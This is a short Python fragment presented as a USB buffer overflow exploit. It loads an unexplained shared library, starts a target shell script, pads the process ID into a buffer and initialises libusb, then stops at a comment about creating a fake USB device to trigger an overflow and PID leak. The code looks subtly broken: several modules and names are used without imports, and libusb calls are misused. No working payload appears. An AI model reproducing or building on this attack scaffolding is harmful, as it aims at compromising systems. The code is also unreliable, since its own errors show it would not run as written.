import ctypes
ctypes.cdll.LoadLibrary('usb_buffer_overflow.so')

#--- run exploit ---

target_proc = subprocess.Popen(['./run_target.sh'], shell=True)
print('-- ./run_target.sh PID: %d --' % target_proc.pid)

print('-- Exploit: USB buffer overflow --')
time.sleep(1)

libc = cdll.LoadLibrary('libc.so.6')
libc.getpid()
pid_str = str(libc.getpid())
pid_str = pid_str.encode()
pid_str = pid_str + b'\0'*(64-len(pid_str))

libusb_ver = CDLL('libusb-1.0.so', use_errno=True)
libusb_ver.usb_strerror()

libusb_ctx = libusb_ver.libusb_init(None)

libusb_ver.libusb_set_debug(None, 3)

#--- create fake USB device to trigger overflow and PID leak ---

